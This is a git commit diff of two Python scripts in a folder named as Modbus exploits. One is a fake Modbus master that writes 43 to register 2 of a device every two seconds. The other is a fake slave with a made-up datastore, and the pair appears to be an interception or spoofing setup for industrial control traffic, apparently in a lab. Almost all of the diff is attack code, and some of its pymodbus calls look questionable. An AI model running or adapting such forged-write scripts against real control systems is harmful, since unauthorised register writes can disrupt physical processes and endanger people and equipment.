8f930f1b32794250fea6c4e1cd244168d0410af3
MagnusMadsen <40494689+MagnusMadsen@users.noreply.github.com>
2026-02-17 13:36:14 +0100

    update

--- Modbus_explots/PyModBus_3.12/modbus_master_proxy.py
+++ Modbus_explots/PyModBus_3.12/modbus_master_proxy.py
@@ -1,34 +1,22 @@
 #!/usr/bin/env python3
+import socket
 from pymodbus.client.tcp import ModbusTcpClient
 import time
 import logging
 
 logging.basicConfig(filename='master_eth1.log', level=logging.INFO)
 
-# Bind til eth1
-sock = socket.socket()
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, b"eth1")
 
 client = ModbusTcpClient("172.16.4.51", port=502, source_address=("172.16.4.50", 502), socket=sock)
 
-print("=== FIKTIV MASTER på ETH1:502 ===")
-print("Skriver 43 til register 2 hvert 2. sekund...")
+print("=== MASTER ETH1:502 ===")
+client.connect()
 
-try:
-    client.connect()
-    while True:
-        # SKRIV 43 til register 2
-        result = client.write_register(2, 43, unit=1)
-        if not result.isError():
-            print("✓ Skrev 43 til reg 2")
-            logging.info("Skrev 43 til reg 2")
-        
-        # LÆS register 2 tilbage (bekræft)
-        read_result = client.read_holding_registers(2, 1, unit=1)
-        if not read_result.isError():
-            print(f"Reg 2 indeholder nu: {read_result.registers[0]}")
-        
-        time.sleep(2)
-finally:
-    client.close()
+while True:
+    client.write_register(2, 43, slave=1)
+    result = client.read_holding_registers(2, 1, slave=1)
+    print(f"Reg 2: {result.registers}")
+    time.sleep(2)
--- Modbus_explots/PyModBus_3.12/modbus_slave_proxy.py
+++ Modbus_explots/PyModBus_3.12/modbus_slave_proxy.py
@@ -6,20 +6,15 @@ import logging
 
 logging.basicConfig(filename='slave_eth0.log', level=logging.INFO)
 
-# Fake datastore - register 2 starter på 0
-store = ModbusSlaveContext(
-    hr=ModbusSequentialDataBlock(0, [0, 0, 0, 123, 0]*100)  # Reg 2 = 123 fra master
-)
+store = ModbusSlaveContext(hr=ModbusSequentialDataBlock(0, [0, 0, 123, 0]*100))
 context = ModbusServerContext(slaves=store, single=True)
 
-sock = socket.socket()
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, b"eth0")
 sock.bind(('172.16.4.51', 502))
 sock.listen(5)
 
-print("=== FIKTIV SLAVE på ETH0:502 ===")
-print("Venter på masterens værdi i register 2...")
-
-server = ModbusTcpServer(context, address=('172.16.4.51', 502), sock=sock)
+print("=== SLAVE ETH0:502 ===")
+server = ModbusTcpServer(context, address=None, sock=sock)
 server.serve_forever()
